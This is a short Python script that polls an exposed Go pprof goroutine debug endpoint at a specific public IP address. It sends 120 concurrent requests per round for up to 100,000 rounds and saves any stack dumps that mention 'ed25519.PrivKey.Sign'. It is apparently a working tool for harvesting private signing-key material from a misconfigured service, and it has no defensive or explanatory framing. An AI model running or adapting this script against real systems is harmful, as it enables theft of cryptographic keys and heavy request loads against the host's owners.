import aiohttp
import asyncio

URL = "http://3.68.86.121:6060/debug/pprof/goroutine?debug=2"
KEYWORD = "ed25519.PrivKey.Sign"
OUTPUT_FILE = "responses.txt"
NUM_REQUESTS = 120
NUM_ITERATIONS = 100000


async def fetch(session, url):
    async with session.get(url) as response:
        #print("got_res")
        return await response.text()


async def main():
    async with aiohttp.ClientSession() as session:
        x1= 0
        for i in range(NUM_ITERATIONS):
            tasks = [fetch(session, URL) for _ in range(NUM_REQUESTS)]
            responses = await asyncio.gather(*tasks)

            if any(KEYWORD in response for response in responses):
                print("Found and saved responses containing the keyword 'ed25519.PrivKey.Sign'")
                with open(OUTPUT_FILE+str(x1), 'a') as file:
                    for response in responses:
                        if KEYWORD in response:
                            file.write(response + "\n\n")
                print("Found and saved responses containing the keyword 'ed25519.PrivKey.Sign'")
                x1+=1


if __name__ == '__main__':
    asyncio.run(main())
